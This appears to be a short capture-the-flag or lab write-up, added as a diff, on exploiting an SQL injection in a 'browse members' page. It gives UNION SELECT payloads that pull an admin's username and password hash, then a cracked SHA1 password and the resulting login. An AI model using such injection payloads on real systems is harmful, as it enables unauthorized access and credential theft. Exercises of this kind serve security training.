@@ -1,0 +1,10 @@
+The browse members page is vulnerable to an SQL injection.
+' UNION SELECT 1,2 from members -- // Checks columns in table members (easy to guess table name)
+' UNION SELECT username,2 from members WHERE admin=1 -- // Shows us the username of someone with admin
+' UNION SELECT password,2 from members where admin=1 -- // Shows us the password of someone with admin
+
+Now we have a username, as well as a seemingly hashed password. Running the hashed password through a sha1 database
+reveals that it is the sha1 hash of sup3r.
+
+Username: bellamond
+Password: sup3r
